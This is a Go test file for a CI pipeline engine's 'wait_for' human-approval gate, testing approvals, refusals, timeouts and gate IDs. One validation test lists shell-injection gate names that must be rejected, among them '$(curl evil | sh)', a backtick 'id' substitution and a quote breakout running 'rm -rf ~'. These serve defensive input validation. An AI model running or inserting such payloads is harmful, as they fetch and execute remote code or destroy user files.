package plan

import (
	"errors"
	"strings"
	"testing"
)

// gated is a fakeRunner that can also wait, answering each gate from a table
// and noting what it was asked.
type gated struct {
	fakeRunner
	answers map[string]Answer
	asked   []Gate
	err     error
}

func (g *gated) Wait(gate Gate) (Answer, error) {
	g.asked = append(g.asked, gate)
	return g.answers[gate.Name], g.err
}

const deployScript = `
def pipeline(ctx):
    run(s("build"))
    answer = wait_for("approve deploy", timeout = "4h")
    if answer.approved:
        run(s("deploy by " + answer.by))
    elif answer.timed_out:
        run(s("nobody answered"))
    else:
        run(s("refused by " + answer.by))
`

func TestAScriptWaitsAndActsOnTheAnswer(t *testing.T) {
	for want, answer := range map[string]Answer{
		"build > deploy by sam":   {Approved: true, By: "sam"},
		"build > refused by alex": {By: "alex"},
		"build > nobody answered": {TimedOut: true},
	} {
		r := &gated{answers: map[string]Answer{"approve deploy": answer}}
		if _, err := pipeline(t, helpers+deployScript, &r.fakeRunner); err == nil {
			t.Fatal("a runner that cannot wait was waited on")
		}
		r = &gated{answers: map[string]Answer{"approve deploy": answer}}
		if _, err := RunPipeline(t.Context(), "ci.star", []byte(helpers+deployScript), ctx, r); err != nil {
			t.Fatalf("pipeline: %v", err)
		}
		if got := r.trace(); got != want {
			t.Errorf("ran %s, want %s", got, want)
		}
		// The gate is known by what the run is for and its name.
		if len(r.asked) != 1 || r.asked[0].Name != "approve deploy" || r.asked[0].Repo != ctx.Repo || r.asked[0].SHA != ctx.SHA || r.asked[0].Seconds != 4*3600 {
			t.Errorf("asked %+v", r.asked)
		}
	}
}

func TestWaitingThatCannotBe(t *testing.T) {
	run := func(body string, r Runner) error {
		_, err := RunPipeline(t.Context(), "ci.star", []byte(helpers+body), ctx, r)
		return err
	}
	for body, fragment := range map[string]string{
		"def pipeline(ctx):\n    wait_for(\"\")\n": "a gate needs a name",
		// A name is printed in a command to be pasted into a shell.
		"def pipeline(ctx):\n    wait_for(\"$(curl evil | sh)\")\n":      "a gate needs a name",
		"def pipeline(ctx):\n    wait_for(\"go`id`\")\n":                 "a gate needs a name",
		"def pipeline(ctx):\n    wait_for(\"a'; rm -rf ~; '\")\n":        "a gate needs a name",
		"def pipeline(ctx):\n    wait_for(\"-flag\")\n":                  "a gate needs a name",
		"def pipeline(ctx):\n    wait_for(\"x\", timeout = \"soon\")\n":  "is not a length of time",
		"def pipeline(ctx):\n    wait_for(\"x\", timeout = \"100ms\")\n": "is not a length of time",
		"wait_for(\"x\")\ndef pipeline(ctx):\n    pass\n":                "only wait inside pipeline(ctx)",
	} {
		if err := run(body, &gated{}); err == nil || !strings.Contains(err.Error(), fragment) {
			t.Errorf("%q: err = %v, want %q", body, err, fragment)
		}
	}
	// Carried out by something that cannot wait: said, and by name.
	err := run("def pipeline(ctx):\n    wait_for(\"approve deploy\")\n", &fakeRunner{})
	if err == nil || !strings.Contains(err.Error(), `wait_for("approve deploy")`) || !strings.Contains(err.Error(), "cannot wait for a person") {
		t.Errorf("err = %v", err)
	}
	// A wait that failed ends the script with the reason.
	err = run("def pipeline(ctx):\n    wait_for(\"approve deploy\")\n", &gated{err: errors.New("the engine went away")})
	if err == nil || !strings.Contains(err.Error(), "the engine went away") {
		t.Errorf("err = %v", err)
	}
	// A basic script has nowhere to wait.
	wantError(t, "def ci(ctx):\n    wait_for(\"x\")\n    return []\n", "only wait inside pipeline(ctx)")
}

func TestADefaultWaitAndAnID(t *testing.T) {
	r := &gated{}
	if _, err := RunPipeline(t.Context(), "ci.star", []byte("def pipeline(ctx):\n    wait_for(\"go\")\n"), ctx, r); err != nil {
		t.Fatal(err)
	}
	if r.asked[0].Seconds != 24*3600 {
		t.Errorf("a gate with no timeout waits %d seconds, want a day", r.asked[0].Seconds)
	}
	a := Gate{Repo: "sam/app", SHA: "abc", Event: "push", Name: "go"}
	same := Gate{Repo: "sam/app", SHA: "abc", Name: "go", Seconds: 60} // no event means push; the wait is not part of it
	if a.ID() != same.ID() {
		t.Error("the same gate has two ids")
	}
	for _, other := range []Gate{
		{Repo: "sam/other", SHA: "abc", Event: "push", Name: "go"},
		{Repo: "sam/app", SHA: "def", Event: "push", Name: "go"},
		{Repo: "sam/app", SHA: "abc", Event: "tag", Name: "go"},
		{Repo: "sam/app", SHA: "abc", Event: "push", Name: "stop"},
	} {
		if other.ID() == a.ID() {
			t.Errorf("%+v has the id of %+v", other, a)
		}
	}
}

func TestWhetherAScriptWaitsIsKnownWithoutRunningIt(t *testing.T) {
	if !Waits("ci.star", []byte(deployScript)) {
		t.Error("a script that calls wait_for is said not to wait")
	}
	if Waits("ci.star", []byte("def pipeline(ctx):\n    run(step(\"a\", image = \"i\", run = \"echo wait_for\"))\n")) {
		t.Error("a script that only mentions wait_for in a string is said to wait")
	}
}
